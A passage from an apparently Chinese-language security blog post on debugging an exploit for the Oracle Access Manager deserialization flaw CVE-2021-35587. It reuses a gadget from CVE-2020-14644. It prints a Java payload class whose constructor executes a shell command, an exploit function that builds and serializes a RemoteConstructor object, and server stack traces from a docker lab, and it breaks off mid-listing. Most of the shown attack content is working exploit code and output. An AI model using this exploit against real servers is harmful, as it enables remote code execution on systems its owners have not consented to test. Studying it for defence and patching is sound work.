</span></span></code></pre></td></tr></table></div></div><h3 id=移植gadget报错noclassdeffounderror>移植gadget报错：NoClassDefFoundError<a hidden class=anchor aria-hidden=true href=#移植gadget报错noclassdeffounderror>#</a></h3><h4 id=noclassdeffounderror>NoClassDefFoundError<a hidden class=anchor aria-hidden=true href=#noclassdeffounderror>#</a></h4><p>CVE-2020-14644最初版本的poccls如下</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-70-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-70-1> 1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-70-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-70-2> 2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-70-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-70-3> 3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-70-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-70-4> 4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-70-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-70-5> 5</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-70-6><a style=outline:none;text-decoration:none;color:inherit href=#hl-70-6> 6</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-70-7><a style=outline:none;text-decoration:none;color:inherit href=#hl-70-7> 7</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-70-8><a style=outline:none;text-decoration:none;color:inherit href=#hl-70-8> 8</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-70-9><a style=outline:none;text-decoration:none;color:inherit href=#hl-70-9> 9</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-70-10><a style=outline:none;text-decoration:none;color:inherit href=#hl-70-10>10</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-70-11><a style=outline:none;text-decoration:none;color:inherit href=#hl-70-11>11</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-70-12><a style=outline:none;text-decoration:none;color:inherit href=#hl-70-12>12</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-70-13><a style=outline:none;text-decoration:none;color:inherit href=#hl-70-13>13</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-70-14><a style=outline:none;text-decoration:none;color:inherit href=#hl-70-14>14</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-70-15><a style=outline:none;text-decoration:none;color:inherit href=#hl-70-15>15</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-70-16><a style=outline:none;text-decoration:none;color:inherit href=#hl-70-16>16</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-70-17><a style=outline:none;text-decoration:none;color:inherit href=#hl-70-17>17</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-70-18><a style=outline:none;text-decoration:none;color:inherit href=#hl-70-18>18</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-70-19><a style=outline:none;text-decoration:none;color:inherit href=#hl-70-19>19</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-70-20><a style=outline:none;text-decoration:none;color:inherit href=#hl-70-20>20</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#f92672>package</span> pers.neo<span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> com.tangosol.internal.util.invoke.Remotable<span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> com.tangosol.internal.util.invoke.RemoteConstructor<span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.io.IOException<span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.io.Serializable<span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>class</span> <span style=color:#a6e22e>test7</span> <span style=color:#66d9ef>implements</span> Remotable<span style=color:#f92672>,</span>Serializable <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#a6e22e>test7</span><span style=color:#f92672>()</span>  <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>        String cmd <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;touch /tmp/hackedbyneo8&#34;</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>try</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>            Runtime<span style=color:#f92672>.</span><span style=color:#a6e22e>getRuntime</span><span style=color:#f92672>().</span><span style=color:#a6e22e>exec</span><span style=color:#f92672>(</span>cmd<span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>}</span> <span style=color:#66d9ef>catch</span> <span style=color:#f92672>(</span>IOException e<span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>            e<span style=color:#f92672>.</span><span style=color:#a6e22e>printStackTrace</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>    
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> RemoteConstructor <span style=color:#a6e22e>getRemoteConstructor</span><span style=color:#f92672>()</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>null</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>setRemoteConstructor</span><span style=color:#f92672>(</span>RemoteConstructor remoteConstructor<span style=color:#f92672>)</span> <span style=color:#f92672>{}</span>
</span></span><span style=display:flex><span><span style=color:#f92672>}</span>
</span></span></code></pre></td></tr></table></div></div><p>最初版本的CVE-2021-35587() 如下</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-71-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-71-1> 1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-71-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-71-2> 2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-71-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-71-3> 3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-71-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-71-4> 4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-71-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-71-5> 5</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-71-6><a style=outline:none;text-decoration:none;color:inherit href=#hl-71-6> 6</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-71-7><a style=outline:none;text-decoration:none;color:inherit href=#hl-71-7> 7</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-71-8><a style=outline:none;text-decoration:none;color:inherit href=#hl-71-8> 8</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-71-9><a style=outline:none;text-decoration:none;color:inherit href=#hl-71-9> 9</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-71-10><a style=outline:none;text-decoration:none;color:inherit href=#hl-71-10>10</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-71-11><a style=outline:none;text-decoration:none;color:inherit href=#hl-71-11>11</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-71-12><a style=outline:none;text-decoration:none;color:inherit href=#hl-71-12>12</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-71-13><a style=outline:none;text-decoration:none;color:inherit href=#hl-71-13>13</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-71-14><a style=outline:none;text-decoration:none;color:inherit href=#hl-71-14>14</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-71-15><a style=outline:none;text-decoration:none;color:inherit href=#hl-71-15>15</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-71-16><a style=outline:none;text-decoration:none;color:inherit href=#hl-71-16>16</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-71-17><a style=outline:none;text-decoration:none;color:inherit href=#hl-71-17>17</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-71-18><a style=outline:none;text-decoration:none;color:inherit href=#hl-71-18>18</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span>	<span style=color:#66d9ef>public</span> <span style=color:#66d9ef>static</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>cve_2021_35587</span><span style=color:#f92672>(</span>Class poccls<span style=color:#f92672>)</span> <span style=color:#66d9ef>throws</span> Exception <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>        ClassIdentity classIdentity <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> ClassIdentity<span style=color:#f92672>(</span>poccls<span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        ClassPool cp <span style=color:#f92672>=</span> ClassPool<span style=color:#f92672>.</span><span style=color:#a6e22e>getDefault</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>        CtClass ctClass <span style=color:#f92672>=</span> cp<span style=color:#f92672>.</span><span style=color:#a6e22e>get</span><span style=color:#f92672>(</span>poccls<span style=color:#f92672>.</span><span style=color:#a6e22e>getName</span><span style=color:#f92672>());</span>
</span></span><span style=display:flex><span>        ctClass<span style=color:#f92672>.</span><span style=color:#a6e22e>replaceClassName</span><span style=color:#f92672>(</span>poccls<span style=color:#f92672>.</span><span style=color:#a6e22e>getName</span><span style=color:#f92672>(),</span> poccls<span style=color:#f92672>.</span><span style=color:#a6e22e>getName</span><span style=color:#f92672>()</span> <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;$&#34;</span> <span style=color:#f92672>+</span> classIdentity<span style=color:#f92672>.</span><span style=color:#a6e22e>getVersion</span><span style=color:#f92672>());</span>
</span></span><span style=display:flex><span>        RemoteConstructor constructor <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> RemoteConstructor<span style=color:#f92672>(</span>
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>new</span> ClassDefinition<span style=color:#f92672>(</span>classIdentity<span style=color:#f92672>,</span> ctClass<span style=color:#f92672>.</span><span style=color:#a6e22e>toBytecode</span><span style=color:#f92672>()),</span>
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>new</span> Object<span style=color:#f92672>[]{}</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        
</span></span><span style=display:flex><span>        AttributeHolder attributeHolder<span style=color:#f92672>=</span><span style=color:#66d9ef>new</span> AttributeHolder<span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>        Method setInternalValue<span style=color:#f92672>=</span>attributeHolder<span style=color:#f92672>.</span><span style=color:#a6e22e>getClass</span><span style=color:#f92672>().</span><span style=color:#a6e22e>getDeclaredMethod</span><span style=color:#f92672>(</span><span style=color:#e6db74>&#34;setInternalValue&#34;</span><span style=color:#f92672>,</span>Object<span style=color:#f92672>.</span><span style=color:#a6e22e>class</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        setInternalValue<span style=color:#f92672>.</span><span style=color:#a6e22e>setAccessible</span><span style=color:#f92672>(</span><span style=color:#66d9ef>true</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        setInternalValue<span style=color:#f92672>.</span><span style=color:#a6e22e>invoke</span><span style=color:#f92672>(</span>attributeHolder<span style=color:#f92672>,</span>constructor<span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        BasicServiceContext basicServiceContext<span style=color:#f92672>=</span><span style=color:#66d9ef>new</span> BasicServiceContext<span style=color:#f92672>(</span><span style=color:#ae81ff>1</span><span style=color:#f92672>,</span>attributeHolder<span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        
</span></span><span style=display:flex><span>        System<span style=color:#f92672>.</span><span style=color:#a6e22e>out</span><span style=color:#f92672>.</span><span style=color:#a6e22e>println</span><span style=color:#f92672>(</span>oamserialize<span style=color:#f92672>(</span>basicServiceContext<span style=color:#f92672>));</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>}</span>
</span></span></code></pre></td></tr></table></div></div><p>将test7直接用传入CVE-2021-35587() 函数中，会报错</p><p>终端错误日志如下：</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-72-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-72-1> 1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-72-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-72-2> 2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-72-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-72-3> 3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-72-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-72-4> 4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-72-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-72-5> 5</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-72-6><a style=outline:none;text-decoration:none;color:inherit href=#hl-72-6> 6</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-72-7><a style=outline:none;text-decoration:none;color:inherit href=#hl-72-7> 7</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-72-8><a style=outline:none;text-decoration:none;color:inherit href=#hl-72-8> 8</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-72-9><a style=outline:none;text-decoration:none;color:inherit href=#hl-72-9> 9</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-72-10><a style=outline:none;text-decoration:none;color:inherit href=#hl-72-10>10</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-72-11><a style=outline:none;text-decoration:none;color:inherit href=#hl-72-11>11</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-72-12><a style=outline:none;text-decoration:none;color:inherit href=#hl-72-12>12</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-72-13><a style=outline:none;text-decoration:none;color:inherit href=#hl-72-13>13</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-72-14><a style=outline:none;text-decoration:none;color:inherit href=#hl-72-14>14</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-72-15><a style=outline:none;text-decoration:none;color:inherit href=#hl-72-15>15</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-72-16><a style=outline:none;text-decoration:none;color:inherit href=#hl-72-16>16</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-72-17><a style=outline:none;text-decoration:none;color:inherit href=#hl-72-17>17</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-72-18><a style=outline:none;text-decoration:none;color:inherit href=#hl-72-18>18</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-xml data-lang=xml><span style=display:flex><span># docker exec oamms tail -f  /u01/oracle/user_projects/domains/access_domain/logs/oam_server1-ms-oamms.log
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>&lt;Jul</span> <span style=color:#960050;background-color:#1e0010>14,</span> <span style=color:#960050;background-color:#1e0010>2022</span> <span style=color:#960050;background-color:#1e0010>11:02:07,458</span> <span style=color:#960050;background-color:#1e0010>AM</span> <span style=color:#960050;background-color:#1e0010>UTC</span><span style=color:#f92672>&gt;</span> <span style=color:#f92672>&lt;Error&gt;</span> <span style=color:#f92672>&lt;HTTP&gt;</span> <span style=color:#f92672>&lt;BEA-101017&gt;</span> <span style=color:#960050;background-color:#1e0010>&lt;</span>[ServletContext@523535658[app:oam_server module:oam path:null spec-version:3.1]] Root cause of ServletException.
</span></span><span style=display:flex><span>java.lang.NoClassDefFoundError: com/tangosol/internal/util/invoke/Remotable
</span></span><span style=display:flex><span>	at java.lang.ClassLoader.defineClass1(Native Method)
</span></span><span style=display:flex><span>	at java.lang.ClassLoader.defineClass(ClassLoader.java:756)
</span></span><span style=display:flex><span>	at java.lang.ClassLoader.defineClass(ClassLoader.java:635)
</span></span><span style=display:flex><span>	at com.tangosol.internal.util.invoke.RemotableSupport.defineClass(RemotableSupport.java:181)
</span></span><span style=display:flex><span>	at com.tangosol.internal.util.invoke.RemotableSupport.realize(RemotableSupport.java:137)
</span></span><span style=display:flex><span>	Truncated. see log file for complete stacktrace
</span></span><span style=display:flex><span>Caused By: java.lang.ClassNotFoundException: com.tangosol.internal.util.invoke.Remotable
</span></span><span style=display:flex><span>	at java.lang.ClassLoader.findClass(ClassLoader.java:523)
</span></span><span style=display:flex><span>	at java.lang.ClassLoader.loadClass(ClassLoader.java:418)
</span></span><span style=display:flex><span>	at java.lang.ClassLoader.loadClass(ClassLoader.java:351)
</span></span><span style=display:flex><span>	at java.lang.ClassLoader.defineClass1(Native Method)
</span></span><span style=display:flex><span>	at java.lang.ClassLoader.defineClass(ClassLoader.java:756)
</span></span><span style=display:flex><span>	Truncated. see log file for complete stacktrace
</span></span><span style=display:flex><span>&gt; 
</span></span></code></pre></td></tr></table></div></div><p>查看日志看到完整错误堆栈</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-73-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-73-1>  1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-73-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-73-2>  2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-73-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-73-3>  3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-73-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-73-4>  4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-73-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-73-5>  5</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-73-6><a style=outline:none;text-decoration:none;color:inherit href=#hl-73-6>  6</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-73-7><a style=outline:none;text-decoration:none;color:inherit href=#hl-73-7>  7</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-73-8><a style=outline:none;text-decoration:none;color:inherit href=#hl-73-8>  8</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-73-9><a style=outline:none;text-decoration:none;color:inherit href=#hl-73-9>  9</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-73-10><a style=outline:none;text-decoration:none;color:inherit href=#hl-73-10> 10</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-73-11><a style=outline:none;text-decoration:none;color:inherit href=#hl-73-11> 11</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-73-12><a style=outline:none;text-decoration:none;color:inherit href=#hl-73-12> 12</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-73-13><a style=outline:none;text-decoration:none;color:inherit href=#hl-73-13> 13</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-73-14><a style=outline:none;text-decoration:none;color:inherit href=#hl-73-14> 14</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-73-15><a style=outline:none;text-decoration:none;color:inherit href=#hl-73-15> 15</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-73-16><a style=outline:none;text-decoration:none;color:inherit href=#hl-73-16> 16</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-73-17><a style=outline:none;text-decoration:none;color:inherit href=#hl-73-17> 17</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-73-18><a style=outline:none;text-decoration:none;color:inherit href=#hl-73-18> 18</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-73-19><a style=outline:none;text-decoration:none;color:inherit href=#hl-73-19> 19</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-73-20><a style=outline:none;text-decoration:none;color:inherit href=#hl-73-20> 20</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-73-21><a style=outline:none;text-decoration:none;color:inherit href=#hl-73-21> 21</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-73-22><a style=outline:none;text-decoration:none;color:inherit href=#hl-73-22> 22</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-73-23><a style=outline:none;text-decoration:none;color:inherit href=#hl-73-23> 23</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-73-24><a style=outline:none;text-decoration:none;color:inherit href=#hl-73-24> 24</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-73-25><a style=outline:none;text-decoration:none;color:inherit href=#hl-73-25> 25</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-73-26><a style=outline:none;text-decoration:none;color:inherit href=#hl-73-26> 26</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-73-27><a style=outline:none;text-decoration:none;color:inherit href=#hl-73-27> 27</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-73-28><a style=outline:none;text-decoration:none;color:inherit href=#hl-73-28> 28</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-73-29><a style=outline:none;text-decoration:none;color:inherit href=#hl-73-29> 29</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-73-30><a style=outline:none;text-decoration:none;color:inherit href=#hl-73-30> 30</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-73-31><a style=outline:none;text-decoration:none;color:inherit href=#hl-73-31> 31</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-73-32><a style=outline:none;text-decoration:none;color:inherit href=#hl-73-32> 32</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-73-33><a style=outline:none;text-decoration:none;color:inherit href=#hl-73-33> 33</a>
